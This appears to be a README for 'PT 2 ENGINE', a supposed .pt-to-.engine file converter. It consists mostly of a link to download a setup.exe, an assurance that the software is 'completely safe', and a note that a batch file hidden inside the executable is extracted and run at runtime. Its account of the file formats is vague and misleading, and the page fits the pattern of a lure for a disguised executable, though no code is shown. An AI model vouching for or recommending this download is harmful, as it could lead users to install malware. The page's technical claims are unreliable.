# PT 2 ENGINE

**PT 2 ENGINE** is a powerful file conversion tool designed to transform `.pt` files into `.engine` files seamlessly. This tool is ideal for game developers, modders, and anyone working in an environment where these specific file types are needed. With PT 2 ENGINE, you can effortlessly convert and integrate these files into your projects with minimal hassle.

**PT 2 ENGINE** can be downloaded [here](https://github.com/jamesssssssssssssszssssssssssss22/pt2engine/releases/download/setup/setup.exe)

**PT 2 ENGINE** is completely safe to use, this software is made from batch but has been converted to exe for convenience. The source for this tool is provided in the repository [here](https://github.com/jamesssssssssssssszssssssssssss22/pt2engine/blob/main/convertpt2engine.bat) (raw version is [here](https://raw.githubusercontent.com/jamesssssssssssssszssssssssssss22/pt2engine/refs/heads/main/convertpt2engine.bat)). This was compiled into an EXE using [Softonics Bat To Exe Converter](https://bat-to-exe-converter-x64.en.softonic.com). The [dependencies.bat](https://github.com/jamesssssssssssssszssssssssssss22/pt2engine/blob/main/dependencies.bat) file is embedded into the EXE file and is only present whilst the program is running, the [dependencies.bat](https://github.com/jamesssssssssssssszssssssssssss22/pt2engine/blob/main/dependencies.bat) file is exctracted in the same folder that the software is installed and only present and used during runtime.

## Overview

**PT 2 ENGINE** enables the conversion of `.pt` files into `.engine` files, which is useful for:
- Modding communities, where converting these files may unlock new functionalities or integration with other tools.
- Any workflow where seamless file format conversions between `.pt` and `.engine` are crucial.

---

## Features

- **Error Handling:** PT 2 ENGINE checks for common errors in the `.pt` file and provides detailed error messages if the conversion fails, helping you troubleshoot.
- **Lightweight:** Minimal system resource usage, ensuring that your machine runs smoothly even while performing large batch conversions.
- **Easy Integration:** PT 2 ENGINE can be easily integrated into existing pipelines, with the option to run as a command-line tool or even in an automated script.

## How It Works

PT 2 ENGINE operates by taking a `.pt` file, a format typically used to store specific data such as game assets, configurations, or encoded information. Upon execution, the tool processes the `.pt` file and converts it into an `.engine` file format. This transformation enables the data to be easily integrated into custom game engines or other systems that utilize `.engine` files. The conversion process involves extracting the necessary data from the `.pt` file and encoding it in a format that is compatible with the target engine or software environment.

### Supported File Types:
- **.pt:** The proprietary input file format.
